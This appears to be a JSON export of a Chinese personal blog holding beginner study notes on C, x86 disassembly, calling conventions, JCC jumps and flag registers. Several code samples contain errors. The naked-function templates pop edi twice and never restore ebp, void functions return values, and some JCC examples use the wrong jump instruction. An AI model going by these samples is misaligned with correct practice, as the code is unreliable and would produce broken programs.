{"meta":{"title":"Welcome to Chumen77's Blog","subtitle":"Struggle 就完事了 !","description":null,"author":"chumen77","url":"https://chumen77.github.io","root":"/"},"pages":[],"posts":[{"title":"C语言与反汇编学习（四）","slug":"C语言与反汇编学习（四）","date":"2019-10-23T14:48:14.000Z","updated":"2019-10-24T13:36:53.000Z","comments":true,"path":"2019/10/23/C语言与反汇编学习（四）/","link":"","permalink":"https://chumen77.github.io/2019/10/23/C语言与反汇编学习（四）/","excerpt":"","text":"C语言与反汇编学习（四）前言本次主要学习以下内容 内存图 全局变量、局部变量 函数参数的分析 分支语句:if if...else... if..else if..else if....else``分支语句的嵌套使用的正向与逆向分析 内存图 -w301 在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。 全局变量、局部变量12345678int g_n = 10; //全局变量int Funcation() //代码区，调用时执行&#123; int x = 1;//局部变量 int y = 3; return g_n+x+y; &#125;&#125; 就用这个代码段来分析。 全局变量的特点1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.3、全局变量所占内存会一直存在，知道整个进程结束.4、全局变量的反汇编识别：MOV 寄存器,byte/word/dword ptr ds:[0x12345678]通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.全局变量就是所谓的基址。 局部变量的特点1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）5、局部变量的反汇编识别：[ebp-4]``[ebp-8]``[ebp-0xC]等等类似的情形。 函数参数的分析如何判断函数有几个参数，已经分别是什么？ 一般情况： 步骤一：观察调用处的代码 1234push 3push 2push 1call 0040100f 步骤二：找到平衡堆栈的代码继续论证 12call 0040100fadd esp,0Ch 或者函数内部 1ret 4/8/0xC/0x10 最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。 但剩下的百分之二十呢？上面的分析存在的问题：1、参数传递未必都是通过堆栈，还可能通过使用寄存器.例： 1234567push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址 2、函数调用处的代码无法查看.例：进入函数查看汇编代码： 12345678910111213141516171819202122232400401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi 00401059 push ecx 0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx 0040106A mov dword ptr [ebp-8],edx0040106D mov dword ptr [ebp-4],ecx00401070 mov eax,dword ptr [ebp-4]00401073 add eax,dword ptr [ebp-8]00401076 add eax,dword ptr [ebp+8]00401079 mov [g_x (00427958)],eax0040107E pop edi 0040107F pop esi 00401080 pop ebx 00401081 mov esp,ebp00401083 pop ebp 00401084 ret 4 观察步骤：1、不考虑ebp、esp2、只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.公式一：寄存器 + ret 4\\8\\0C = 参数个数公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数这两个公式可以互相结合验证看是否算的对。如以上代码段，只可以找到edi,ecx,edx给别人赋值，但是其中edi ecx都是函数内存赋的值，所以只剩下edx，在加上最后的ret 4（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，[ebp+0x]类似的只出现一个. 分支语句正向代码练习 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。 1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;int g_x = 5;int g_y = 3;int g_z = 7;int g_r = 0;void getMax()&#123; if(g_x&gt;g_y) &#123; if (g_x&gt;g_z) &#123; g_r=g_x; &#125; else&#123; g_r=g_z; &#125; &#125; else if (g_y &gt; g_z) &#123; g_r=g_y; &#125; else g_r=g_z; printf(&quot;%d\\n&quot;,g_r);&#125;int main(int argc, char* argv[])&#123; getMax(); return 0;&#125; 练习2:找出数组里面最大的值，并存储到全局变量中 -w238 12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;stdafx.h&quot;int a[4] = &#123;2,5,7,9&#125;;int g_r = 0;void getMax()&#123; if(a[0]&gt;a[1]) &#123; if (a[0]&gt;a[2]) &#123; if (a[0]&gt;a[3]) &#123; g_r=a[0]; &#125; else g_r=a[3]; &#125; else if(a[2]&gt;a[3])&#123; g_r=a[2]; &#125; else g_r=a[3]; &#125; else if (a[1] &gt; a[2]) &#123; if (a[1]&gt;a[3]) &#123; g_r=a[1]; &#125; else g_r=a[3]; &#125; else if (a[2] &gt; a[3]) &#123; g_r=a[2]; &#125; else g_r=a[3]; printf(&quot;%d\\n&quot;,g_r);&#125;int main(int argc, char* argv[])&#123; getMax(); return 0;&#125; 感悟1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。2：一个if只对应于一个else，else只能在if后出现与其搭配使用。 逆向分析IF语句逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。） -w262 汇编代码： -w331 对于这段代码我们采取一定的分析顺序来分析： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 无 分析全局变量 mov dword ptr 004225c4,ecx 功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中 返回值分析 无 练习： -w367 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：a 分析全局变量 mov eax,[004225c4]: m 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 逆为c函数： 1234567891011int m=1;void Funcation(int x, int y)&#123; int a; a=m; if(x&lt;=y) &#123; y=y+a; m=y; &#125;&#125; IF…ELSE…语句逆向分析if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。 -w226 特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码总结：跳转执行一部分代码，不跳转执行另外一部分代码汇编代码： -w369 同样安装一定的顺序： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4] = eax = [004225c4] 分析全局变量 [004225c4] G 功能分析:比较X与Y的大小如果X&lt;=Y 那么执行 123456004010E6 mov eax,dword ptr [ebp+0Ch] 004010E9 add eax,dword ptr [ebp-4]004010EC mov [004225c4],eax//G = Y``` 如果X&gt;Y 那么执行 004010D8 mov edx,dword ptr [ebp+8] X 004010DB add edx,dword ptr [ebp-4] X = X + G 004010DE mov dword ptr [004225c4],edx 004010E4 jmp 004010f1 //G = X 12345678910111213141516 5. 返回值分析 无练习：![-w382](/images/15719223446828.jpg)1. 分析参数：`[ebp+8] : X ` `[ebp+0Ch] :Y`2. 分析局部变量 `[ebp-4]：eax:[004225c4]:a` `[ebp-8]:b:2`3. 分析全局变量 `mov eax,[004225c4]` 4. 功能分析:(省略，直接以c语言代码表示)5. 返回值分析 无还原成c函数： int m=1;void Funcation(int x,int y){ int a,b; a=m; b=2; if (x&gt;=y) { b=b+1; if (x&lt;y) { m=b; }else m=a+b; }} 12345678910111213141516![](/images/15719224472672.jpg)#### IF...ELSE IF...ELSE逆向分析![-w307](/images/15719225611187.jpg)特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，**所有jmp的目标地址一致**。根据以上特征，把jxx指令取反，即可还原if...else if....else语句的代码。**如果某个分支没有条件判断，则为else部分**。汇编代码：![-w334](/images/15719226993158.jpg) 函数内部功能分析： 1、分析参数：`[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z` 2、分析局部变量 `[ebp-4] = A = 0 [ebp-8] = B = 1 [ebp-0Ch] = C = 2` 3、分析全局变量 无 4、功能分析 if(x&gt;y) { A = B+1; } else if(x&gt;z) { A = C+1; } else if(x&gt;z) { A = B+C } else { A = B+C+1; } return A; 12345678练习：![-w305](/images/15719228667624.jpg)1、分析参数：`[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z` 2、分析局部变量 `[ebp-4] = A [ebp-8] = B [ebp-0Ch] = C ` 3、分析全局变量 无 4.返回值分析 a+1 还原成C函数： int Funcation(int x,int y,int z){ int a=0; int b=1; int c=2; if (x&lt;=y) { a=b-1; } else if (y&gt;=z) { a=c+1; } else if (x&gt;z) { a=b+c; } else a=b+c-1; return a+1;} {% image /images/15719229837839.jpg '' '' %} #### 感悟 每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（三）","slug":"C语言学习与反汇编（三）","date":"2019-10-20T15:45:40.000Z","updated":"2019-10-23T14:48:14.000Z","comments":true,"path":"2019/10/20/C语言学习与反汇编（三）/","link":"","permalink":"https://chumen77.github.io/2019/10/20/C语言学习与反汇编（三）/","excerpt":"","text":"C语言与反汇编学习（三）前言本次主要学习一下C语言的数据类型与数据存储。 数据类型 -w709 学习数据类型的三个要素1、存储数据的宽度2、存储数据的格式3、作用范围(作用域)这些都是谈起一个数据类型的基本要素。 整数类型：char short int long char 8BIT 1字节 short 16BIT 2字节 int 32BIT 4字节 long 32BIT 4字节 123char i = 0xFF;short x =0xFF;long y =0xFF; 我们来看下在汇编其是什么样的： -w505 注意byte word dword的区别。然后我们测试一下以下代码： 123char i = 0x12345678;short x = 0x12345678;long y = 0x12345678; -w639 然后看到还是byte word dword，并且也没有报错，但是我们运行以后可以看到 -w1106 这就说明你写了32位的数给char i这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。 整数类型分为有符号(signed)和无符号(unsigned)两种： 12char i = 0xFF;unsigned char i = 0xFF; 要知道其在内存里存着显示的都是FF -w178 但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在类型转换和大小比较中特别注意。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，会把其会把汇编代码跳转那里改成特定对应的JCC代码（只要针对无符号，因为默认是有符号的）。例子：无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号） -w533 总结：1：在内存中存储的方式完全一样 。 2：在类型转换和大小比较中特别注意（运算）。 浮点类型：float doublefloat和double在存储方式上都是遵从IEEE的规范的float的存储方式如下图所示： -w619 double的存储方式如下图所示： -w729 将一个float型转化为内存存储格式的步骤为: 先将这个实数的绝对值化为二进制格式 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。 从小数点右边第一一位开始数出二十三位数字放入第22到第0位。 如果实数是正的，则在第31位放入“0”，否则放入“1”。 如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。 如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。 如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。 这是官方解释。有点麻烦。先练习一个：8.25转成浮点存储 -w271 -w229 所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值) -w409 按四位分割0100 0001 0000 0100 0000 0000 0000 0000=41040000，然后就这样的形式存入计算机内存。 我下面用简单的且是正确的办法来转换：将float类型的12.5 转换成16进制：先整理正数部分，12=C=1100小数部分 0.5 * 2=1.0所以二进制就是1100.1，科学计数法 1.1001x2^3这次对中间格子是直接用127+x的结果 变成二进制填充这个格子，x的值就是指数，其中左移是正右移为负 -w382 double类型前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。 double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩余42位用于表示位数。在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，加1023后可用于指数符号判断。 double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程来转换double类型。 -w756 英文字符存储char x = ‘A’;对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例： -w446 -w420 补充： 标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。 ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。 扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。 为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（二）","slug":"C语言与反汇编学习（二）","date":"2019-10-19T15:49:13.000Z","updated":"2019-10-20T15:06:42.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（二）/","link":"","permalink":"https://chumen77.github.io/2019/10/19/C语言与反汇编学习（二）/","excerpt":"","text":"C语言与反汇编学习（二）前言本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。 裸函数什么是裸函数？12void __declspec(naked) Function() &#123;.....&#125; 在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。 运行裸函数为什么会出错以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以： 1234void __declspec(naked) Function() &#123; __asm ret&#125; 加一个ret就好了，不会再报错了。 裸函数框架简单集合无参数无返回值的函数框架1234567891011121314151617181920212223void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 有参数有返回值的函数框架123456789101112131415161718192021222324252627void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 带局部变量的函数框架1234567891011121314151617181920212223242526272829void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] //注意汇编中局部变量的存放办法 pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。 针对裸函数的练习目标是要实现以下功能： 1234567int plus(int x,int y,int z)&#123; int a = 2; int b = 3; int c = 4; return x+y+z+a+b+c;&#125; 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked) plus(int x,int y,int z)&#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 //开栈 push ebx push esi push edi //保护现场 lea edi,dword ptr ds:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd //为缓冲区填充数据 //真正要执行的功能 //局部变量：EBP—4开始 参数：ebp+8开始 //ebp+4是eip 原来call下条语句 mov eax,0x2 mov dword ptr ds:[ebp-0x4],eax mov eax,0x3 mov dword ptr ds:[ebp-0x8],eax mov eax,0x4 mov dword ptr ds:[ebp-0x0C],eax //放入局部变量 mov eax,dword ptr ds:[ebp+0x8] add eax,dword ptr ds:[ebp+0x0C] add eax,dword ptr ds:[ebp+0x10] add eax,dword ptr ds:[ebp-0x4] add eax,dword ptr ds:[ebp-0x8] add eax,dword ptr ds:[ebp-0x0C] mov dword ptr ds:[ebp-0x4],eax //把计算结果放入栈中，下面主函数打印a时要用到 pop edi; pop esi; pop ebx; mov esp,ebp pop ebp ret &#125;&#125;int main(int argc, char* argv[])&#123; int a; a=plus(6,7,8); printf(&quot;%d\\n&quot;,a); return 0;&#125; 练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。 程序真正的入口main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。 在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。 main 函数的识别与寻找只是vc++6.0main 函数被调用前要先调用的函数如下： GetVersion() _heap_init() GetCommandLineA() _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() -w414 这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。 函数调用约定常见的几种约定： -w355 cdecl使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。 -w267 stdcallstdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用_ stdcall关键字即可。 -w295 栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。 像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， 被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小。 虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。 fastcallfastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。 -w292 就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。 -w330 这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。 第一次完整逆一个exe（CallingConvention.exe）汇编分析 -w855 简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走： -w679 疑似出现符合的情况，这时候按F7进去查看内部： -w535 简单一看，就是我们要找的main函数。接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析： -w1307 -w1311 -w1254 （箭头指的不是特别好……） 逆成c代码123456789101112131415161718192021222324#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c)&#123; return a+b+c;&#125;int __cdecl plus3(int a,int b)&#123; return a+b;&#125;int __fastcall plus(int a,int b,int c,int d,int e)&#123; int z,s; z=plus2(a,b,c); s=plus3(b,a); return plus3(z,s);&#125;int main(int argc, char* argv[])&#123; int x; x=plus(1,3,4,6,7); printf(&quot;%d\\n&quot;,x); return 0;&#125; 这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是 开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、 fastcall的认识不是很好 传入的6 7做了什么也不是很清楚最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（一）","slug":"C语言与反汇编学习（一）","date":"2019-10-19T02:26:17.000Z","updated":"2019-10-19T03:45:18.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（一）/","link":"","permalink":"https://chumen77.github.io/2019/10/19/C语言与反汇编学习（一）/","excerpt":"","text":"C语言与反汇编学习（一）前言：本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。 简单下熟悉VC6开发环境这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。 创建项目 -w911 执行过程代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5) 一些简单操作设置断点设置断点是光标放到哪行代码后按下F9即可，这也是后面很多操作的最重要的起初操作。 -w338 调出寄存器，栈，内存窗口调出寄存器，栈，内存窗口 -w586 看图，在空白处右击点击一下你需要的窗口就好了。 -w526 进入反汇编窗口在程序运行时，且有适当断点的时候，看图 -w517 右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：F10 F11分别是步过和步入。这个跟od里不一样。 C语言的调用1、无参数，无返回值的函数调用2、有参数，无返回值的函数调用3、无参数，有返回值的函数调用4、有参数，有返回值的函数调用 函数的反汇编分析-空函数先上c：123456789#include &quot;stdafx.h&quot;void Function()&#123;&#125;int main(int argc, char* argv[])&#123; Function() return 0;&#125; 反汇编分析： -w438 函数的反汇编分析-简单功能两个数相加：c代码：12345678910#include &quot;stdafx.h&quot;void Plus(int x,int y)&#123; return x+y;&#125;int main(int argc, char* argv[])&#123; Plus(2,1); return 0;&#125; 反汇编分析： -w709 三个数相加：c代码：12345678910#include &quot;stdafx.h&quot;void Plus(int x,int y，int z)&#123; return x+y;&#125;int main(int argc, char* argv[])&#123; Plus(2,1,3); return 0;&#125; 反汇编分析： -w974 （和上面那个基本一样，只是为了练习，不详细写了） 函数的反汇编分析-嵌套调用要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2). c代码12345678910111213141516171819#include &quot;stdafx.h&quot;int Plus1(int x,int y)&#123; return x+y;&#125;int Plus2(int x,int y,int z)&#123; return x+y+z;&#125;int Plus3(int a,int b,int c,int d,int e)&#123; int i,j,m; i=Plus1(a,b); j=Plus2(c,d,e); m=Plus1(i,j); return m;&#125;int main(int argc, char* argv[]) &#123; Plus3(2,1,3,1,5); return 0; &#125; 反汇编分析： -w1534 （中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。） 总结：学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记）也熟悉了函数是如何嵌套调用的。","categories":[],"tags":[]},{"title":"JCC学习","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2019-10-19T15:48:32.000Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"https://chumen77.github.io/2019/10/07/JCC/","excerpt":"","text":"JCC学习JCC指令集合详细__1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、JS 结果为负则跳转 SF=1 4、JNS 结果为非负则跳转 SF=0 5、JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、JO 结果溢出了则跳转 OF=1 8、JNO 结果没有溢出则跳转 OF=0 9、JB, JNAE 小于则跳转 (无符号数) CF=1 10、JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 表格总结 -w1067 直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要注意那些有符号的JCC跳转指令，因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。 注意：JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的 练习使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.前提：能用CMP和TEST实现的优先考虑. 1、JE, JZ 结果为零则跳转(相等时跳转) ZF=11234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0123MOV AL,1TEST AL,ALJNZ 0X00401006 ####3、 JS 结果为负则跳转 SF=1 123MOV AL,1MOV CL,2CMP AL,CL 4、 JNS 结果为非负则跳转 SF=012XOR EAX,EAXJNS 0X0040102F 5、 JP, JPE 结果中1的个数为偶数则跳转 PF=11234MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008 6、JNP, JPO 结果中1的个数为奇数则跳转 PF=01234MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008 7、 JO 结果溢出了则跳转 OF=1123MOV AL,80SUB AL,10JO 0X00401008 8、 JNO 结果没有溢出则跳转 OF=0123MOV AX,0FFFFADD AX,80JNO 0X00401010 9、 JB, JNAE 小于则跳转 (无符号数) CF=11234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 10、 JNB, JAE 大于等于则跳转 (无符号数) CF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。 1234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 或者 1234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 解析： 这个与练习10的区别就是不可以让两个数相等。 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF12345MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063 解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！ 比如这个练习用到了JL,FF就是-1了，那么-1&lt;1这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF1234MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B 15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF1234MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B 这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，这两个操作数只能是相同的数，没什么看不看做有无符号的说法。 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF1234MOV AX,1MOV CX,FFCMP AX,CXJG 0x004010A6 1234MOV AL,1MOV CL,0FFCMP AL,CLJG 0x004010A6 解析： 判断一下，第1段代码对还是第2段代码对？ 在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，且一定要注意下数据宽度。在这个例子中，第一段代码是无法实现JG跳转的，因为其数据宽度的问题，影响到SF,所以其没办法SF=OF就没法跳转。","categories":[],"tags":[]},{"title":"标志寄存器","slug":"标志寄存器","date":"2019-10-06T14:01:14.000Z","updated":"2019-10-17T15:47:57.000Z","comments":true,"path":"2019/10/06/标志寄存器/","link":"","permalink":"https://chumen77.github.io/2019/10/06/标志寄存器/","excerpt":"","text":"标志寄存器部分标志寄存器详细介绍 需要先熟练记住这几个寄存器的位置和名称：CF PF AF ZF SF OF CF进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 解析：在看运算结果的时候，先提前确定好参与运算的数是有无符号数和它们的数据宽度。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。 PF奇偶标志PF(Parity 